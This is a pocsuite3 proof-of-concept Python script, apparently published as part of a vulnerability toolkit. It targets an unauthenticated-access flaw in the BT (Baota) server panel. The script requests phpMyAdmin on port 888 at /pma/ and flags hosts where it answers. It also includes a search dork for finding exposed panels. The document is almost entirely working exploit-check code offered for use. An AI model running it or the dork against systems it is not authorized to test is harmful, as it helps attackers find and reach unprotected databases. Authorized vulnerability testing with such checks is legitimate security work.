
"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from urllib.parse import urlparse
from pocsuite3.api import Output, POCBase, register_poc, logger, requests


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '3.0'
    author = ['YIGEBEACH']
    vulDate = '2020-8-24'
    createDate = '2020-8-24'
    updateDate = '2020-8-24'
    references = ['https://github.com/YIGEBEACH/BT-UNAUTH-Access-PHPMyAdmin']
    name = 'BT UNAuth'
    appPowerLink = ''
    appName = 'BT'
    appVersion = 'Linux正式版7.4.2/Linux测试版7.5.13/Windows正式版6.8'
    vulType = 'UNAuth'
    desc = '''
    dork："Set-Cookie: BT_PANEL_6"
    '''
    samples = []
    install_requires = ['']

    def exploit(self, mode):
        result = {}

        url_pr = urlparse(self.url)
        scheme = url_pr.scheme
        host = url_pr.hostname
        port = 888

        vul_url = "{}://{}:{}/pma/".format(scheme, host, port)
        resp = requests.get(vul_url, timeout=5)
        if resp.status_code == 200 and "phpmyadmin" in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
        return result

    def _verify(self):
        result = {}

        try:
            result = self.exploit(mode='verify')
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
